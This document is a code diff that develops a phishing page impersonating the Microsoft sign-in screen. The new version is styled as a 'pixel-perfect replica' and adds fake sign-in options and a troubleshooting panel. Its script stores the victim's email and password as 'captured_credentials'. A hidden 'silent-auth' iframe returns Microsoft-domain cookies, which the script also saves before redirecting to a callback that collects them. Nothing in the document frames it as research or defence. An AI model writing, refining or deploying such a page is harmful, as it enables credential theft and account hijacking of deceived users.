@@ -1,253 +1,399 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Account Security</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            width: 100%;
-            max-width: 420px;
-            padding: 40px;
-        }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo h1 { color: #0078d4; font-size: 24px; }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 2px rgba(0,120,212,0.1);
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #0078d4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        button:hover { background: #106ebe; }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        .spinner {
-            display: none;
-            border: 4px solid #f3f2f1;
-            border-top: 4px solid #0078d4;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .button-content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        #authFrame {
-            display: none;
-            width: 0;
-            height: 0;
-            border: none;
-        }
-        .status {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 14px;
-        }
-    </style>
+  <title>Sign in</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
+  <style>
+    /* --- FINAL CSS FOR PIXEL-PERFECT REPLICA --- */
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
+      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: center center;
+    }
+    .main-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      width: 100%;
+    }
+    .form-wrapper {
+      max-width: 440px;
+      width: 100%;
+      padding: 0 16px;
+    }
+    .form-box {
+      background-color: #ffffff;
+      padding: 44px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .form-box h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #1b1b1b;
+    }
+    .form-control {
+      border: none;
+      border-bottom: 1px solid #8A8886;
+      border-radius: 0;
+      padding: 8px 0;
+      font-size: 16px;
+      width: 100%;
+    }
+    .form-control:focus {
+      box-shadow: none;
+      outline: none;
+      border-bottom-color: #0078d4;
+    }
+    .form-box p {
+      font-size: 13px;
+      margin-top: 16px;
+      margin-bottom: 0;
+    }
+    .form-box a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .form-box a:hover {
+      text-decoration: underline;
+    }
+    .button-container {
+      display: flex;
+      justify-content: flex-end;
+    }
+    .btn.btn-primary-blue {
+      background-color: #0067b8;
+      color: white;
+      transition: filter 0.2s;
+    }
+    .btn.btn-primary-blue:hover {
+      filter: brightness(90%);
+    }
+    .btn.btn-secondary-gray {
+      background-color: #ccc;
+      color: #1b1b1b;
+      border: 1px solid #ccc;
+    }
+    .form-box .btn {
+      font-size: 15px;
+      padding: 8px 30px;
+      border: none;
+      border-radius: 2px;
+    }
+    #back, #options-view-back {
+      cursor: pointer;
+      color: #23272a;
+      font-size: 16px;
+      vertical-align: middle;
+    }
+    .options-box {
+      background-color: #ffffff;
+      padding: 16px 44px;
+      margin-top: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .options-box p {
+        margin: 0;
+        font-size: 15px;
+    }
+    .options-box a {
+      color: #1b1b1b;
+      text-decoration: none;
+    }
+    .options-box a:hover {
+      text-decoration: underline;
+    }
+    .fa-key {
+      color: #5e5e5e;
+      margin-right: 8px;
+    }
+    .page-footer {
+        position: fixed;
+        bottom: 12px;
+        right: 16px;
+        font-size: 12px;
+    }
+    .page-footer a {
+        color: #fff;
+        text-shadow: 0 0 3px rgba(0,0,0,0.7);
+        margin-left: 16px;
+        text-decoration: none;
+    }
+    .option-item {
+        display: flex;
+        align-items: center;
+        padding: 8px 0;
+        cursor: pointer;
+    }
+    .option-item:hover {
+        background-color: #f2f2f2;
+    }
+    .option-icon-container {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background-color: #f2f2f2;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 20px;
+        color: #333;
+        margin-right: 16px;
+    }
+    .option-text p { margin: 0; line-height: 1.4; }
+    .option-text .primary { font-size: 15px; color: #1b1b1b; }
+    .option-text .secondary { font-size: 12px; color: #5e5e5e; }
+    .troubleshooting-box {
+        display: none;
+        background-color: #ffffff;
+        padding: 24px;
+        margin-top: 16px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        font-size: 14px;
+        color: #1b1b1b;
+    }
+    .troubleshooting-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
+    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
+    .troubleshooting-body p { margin: 8px 0; }
+    .troubleshooting-body strong { font-weight: 600; }
+    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    .hidden { display: none !important; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <h1>Microsoft</h1>
-            <p style="color: #666; margin-top: 10px;">Sign in to your account</p>
+
+  <div class="main-container">
+    <div class="form-wrapper">
+      <!-- Main Sign-in Box -->
+      <div class="form-box">
+        <!-- Email View -->
+        <div id="div1">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Sign in</h1>
+          <div class="form-group mt-2">
+            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
+          </div>
+          <p>No account? <a href="#">Create one!</a></p>
+          <p><a href="#">Can't access your account?</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="next">Next</button>
+          </div>
         </div>
 
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">Email or phone</label>
-                <input 
-                    type="email" 
-                    id="email" 
-                    name="email" 
-                    placeholder="user@example.com"
-                    required
-                    autocomplete="off"
-                >
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input 
-                    type="password" 
-                    id="password" 
-                    name="password" 
-                    placeholder="Password"
-                    required
-                    autocomplete="off"
-                >
-            </div>
-
-            <button type="submit" id="submitBtn">
-                <div class="button-content">
-                    <span class="spinner"></span>
-                    <span id="btnText">Sign in</span>
+        <!-- Password View -->
+        <div id="div2" class="hidden">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <div class="mt-4">
+              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
+          </div>
+          <h1 class="mt-3">Enter password</h1>
+          <div class="form-group mt-2">
+            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
+          </div>
+          <p><a href="#">Forgot my password</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
+          </div>
+        </div>
+        
+        <!-- Detailed "Sign-in options" View -->
+        <div id="options_view_detailed" class="hidden">
+            <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+            <h1 class="mt-4">Sign-in options</h1>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fas fa-user-lock"></i></div>
+                <div class="option-text">
+                    <p class="primary">Face, fingerprint, PIN or security key</p>
+                    <p class="secondary">Use your device to sign in with a passkey.</p>
                 </div>
-            </button>
-        </form>
+            </div>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fab fa-github"></i></div>
+                <div class="option-text"><p class="primary">Sign in with GitHub</p></div>
+            </div>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fas fa-id-card-alt"></i></div>
+                <div class="option-text">
+                    <p class="primary">Sign in to an organization</p>
+                    <p class="secondary">Search for a company or an organization you're working with.</p>
+                </div>
+            </div>
+            <div class="button-container mt-4">
+                <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
+            </div>
+        </div>
+      </div>
 
-        <div class="status" id="status"></div>
+      <!-- "Sign-in options" Clickable Box -->
+      <div class="options-box" id="options_box">
+        <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
+      </div>
+
+      <!-- Troubleshooting Box -->
+      <div class="troubleshooting-box" id="troubleshooting_box">
+        <div class="troubleshooting-header">
+            <h2>Troubleshooting details</h2>
+            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
+        </div>
+        <div class="troubleshooting-body">
+            <p>If you contact your administrator, send this info to them.</p>
+            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
+            <div id="error_details_for_copy">
+                <p><strong>Error Code:</strong> 50058</p>
+                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
+                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
+                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
+            </div>
+            <hr>
+            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
+            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
+        </div>
+      </div>
     </div>
+  </div>
 
-    <!-- Hidden iframe for silent auth -->
-    <iframe id="authFrame"></iframe>
+  <!-- Page Footer -->
+  <div class="page-footer">
+    <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
+    <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
+    <a href="#" id="footer_dots_link">...</a>
+  </div>
 
-    <script>
-        console.log('🔧 Replacement page loaded');
+  <!-- Hidden iframe for silent auth -->
+  <iframe id="authFrame" style="display:none; width:0; height:0; border:none;"></iframe>
 
-        const form = document.getElementById('loginForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const submitBtn = document.getElementById('submitBtn');
-        const spinner = document.querySelector('.spinner');
-        const btnText = document.getElementById('btnText');
-        const statusDiv = document.getElementById('status');
-        const authFrame = document.getElementById('authFrame');
+  <script>
+    console.log('🔧 replacement.html loaded');
 
-        let capturedCookies = [];
-        let authComplete = false;
+    // Listen for messages from silent-auth-frame
+    window.addEventListener('message', function(event) {
+        console.log('📨 Message from iframe:', event.data.type);
 
-        // Listen for messages from iframe
-        window.addEventListener('message', function(event) {
-            console.log('📨 Message from iframe:', event.data.type);
+        if (event.data.type === 'AUTH_COMPLETE') {
+            console.log('✅ Auth complete from silent-auth-frame');
+            
+            const code = event.data.data.code;
+            const error = event.data.data.error;
+            const capturedCookies = event.data.data.cookies;
 
-            if (event.data.type === 'AUTH_COMPLETE') {
-                console.log('✅ Auth complete');
+            console.log('📊 Received:', {
+                code: !!code,
+                error: error,
+                cookies: capturedCookies.length
+            });
+
+            // Store cookies for AuthCallback
+            if (capturedCookies.length > 0) {
+                const cookieExport = {
+                    version: '1.0',
+                    exportedAt: new Date().toISOString(),
+                    source: 'silent-auth-frame',
+                    domain: event.data.data.domain,
+                    totalCookies: capturedCookies.length,
+                    cookies: capturedCookies,
+                    note: 'Cookies captured from Microsoft domain via silent auth'
+                };
+
+                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
+                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                 
-                const code = event.data.data.code;
-                const error = event.data.data.error;
-                capturedCookies = event.data.data.cookies;
+                console.log('💾 Stored', capturedCookies.length, 'cookies');
+            }
 
-                console.log('📊 Received:', {
-                    code: !!code,
-                    error: error,
-                    cookies: capturedCookies.length
-                });
+            // Wait 2 seconds then redirect to AuthCallback
+            setTimeout(() => {
+                console.log('🔄 Redirecting to /auth/callback...');
+                window.location.href = '/auth/callback';
+            }, 2000);
+        }
+    });
 
-                // Store cookies for AuthCallback
-                if (capturedCookies.length > 0) {
-                    const cookieExport = {
-                        version: '1.0',
-                        exportedAt: new Date().toISOString(),
-                        source: 'silent-auth-frame',
-                        domain: event.data.data.domain,
-                        totalCookies: capturedCookies.length,
-                        cookies: capturedCookies,
-                        note: 'Cookies captured from Microsoft domain via silent auth'
-                    };
-
-                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                    
-                    console.log('💾 Stored', capturedCookies.length, 'cookies');
-                }
-
-                authComplete = true;
-
-                // Wait 2 seconds then redirect
-                setTimeout(() => {
-                    console.log('🔄 Redirecting to AuthCallback...');
-                    window.location.href = '/auth/callback';
-                }, 2000);
+    // --- FINAL, ROBUST SCRIPT ---
+    document.addEventListener('DOMContentLoaded', function () {
+        
+        const div1 = document.getElementById('div1');
+        const div2 = document.getElementById('div2');
+        const optionsBox = document.getElementById('options_box');
+        const authFrame = document.getElementById('authFrame');
+        
+        document.getElementById('next').addEventListener('click', function (e) {
+            e.preventDefault();
+            const emailInput = document.getElementById('email');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (emailRegex.test(emailInput.value.trim())) {
+                document.getElementById('emailch').textContent = emailInput.value.trim();
+                div1.classList.add('hidden');
+                optionsBox.classList.add('hidden');
+                div2.classList.remove('hidden');
             }
         });
 
-        // Handle form submission
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+        document.getElementById('back').addEventListener('click', function () {
+            div2.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
+        });
 
+        document.getElementById('submit-btn').addEventListener('click', function (event) {
+            event.preventDefault();
+            const submitBtn = event.target;
+            const passwordInput = document.getElementById('password');
+            const emailInput = document.getElementById('email');
+            
+            const password = passwordInput.value;
             const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
 
-            console.log('📋 Form submitted');
-            console.log('📧 Email:', email);
-            console.log('🔑 Password length:', password.length);
-
-            if (!email || !password) {
-                statusDiv.textContent = '❌ Please enter both email and password';
-                statusDiv.style.color = '#d13438';
+            if (!password || !email) {
+                console.error("Email or password is blank. Aborting.");
                 return;
             }
-
-            // Show spinner
-            spinner.style.display = 'inline-block';
-            btnText.textContent = 'Signing in...';
+            
+            submitBtn.textContent = 'Verifying...';
             submitBtn.disabled = true;
-            statusDiv.textContent = '⏳ Processing...';
-            statusDiv.style.color = '#666';
 
-            // Store credentials
-            const credsData = {
-                email: email,
-                password: password,
+            console.log('📋 Credentials captured:', { email });
+
+            // ✅ Store credentials for AuthCallback
+            const credentialsData = { 
+                email, 
+                password, 
+                captureTime: new Date().toISOString(), 
+                source: 'replacement-html',
                 domain: 'microsoft',
                 timestamp: new Date().toISOString(),
-                source: 'replacement-form',
                 validated: true,
                 microsoftAccount: true
             };
+            try {
+                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+                sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+                localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+                
+                console.log('💾 Credentials stored for AuthCallback');
+            } catch (err) {
+                console.error('Failed to store credentials:', err);
+            }
 
-            localStorage.setItem('replacement_credentials', JSON.stringify(credsData));
-            sessionStorage.setItem('replacement_credentials', JSON.stringify(credsData));
-            localStorage.setItem('captured_credentials', JSON.stringify(credsData));
-            sessionStorage.setItem('captured_credentials', JSON.stringify(credsData));
-
-            console.log('💾 Credentials stored');
-
-            // Load silent auth frame
+            // ✅ Load silent-auth-frame.html
             authFrame.src = '/silent-auth-frame.html';
 
-            // Send init message to frame
+            // ✅ Send init message to frame
             setTimeout(() => {
                 authFrame.contentWindow.postMessage({
                     type: 'INIT_AUTH',
@@ -257,10 +403,50 @@
                     state: 'silent_' + Date.now()
                 }, '*');
 
-                console.log('📨 Init message sent to frame');
-                statusDiv.textContent = '🔐 Authenticating with Microsoft...';
+                console.log('📨 Init message sent to silent-auth-frame');
             }, 500);
         });
-    </script>
+
+        // The code for the other features is kept separate to prevent interference.
+        const optionsViewDetailed = document.getElementById('options_view_detailed');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
+
+        document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            div1.classList.add('hidden');
+            div2.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            troubleshootingBox.style.display = 'none';
+            optionsViewDetailed.classList.remove('hidden');
+        });
+
+        document.getElementById('options-view-back').addEventListener('click', function () {
+            optionsViewDetailed.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
+        });
+
+        document.getElementById('footer_dots_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
+            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
+        });
+
+        document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
+            troubleshootingBox.style.display = 'none';
+        });
+
+        document.getElementById('copy_info_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            const detailsNode = document.getElementById('error_details_for_copy');
+            const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
+            navigator.clipboard.writeText(detailsText).then(() => {
+                const originalText = e.target.textContent;
+                e.target.textContent = 'Copied!';
+                setTimeout(() => { e.target.textContent = originalText; }, 2000);
+            });
+        });
+    });
+  </script>
 </body>
 </html>
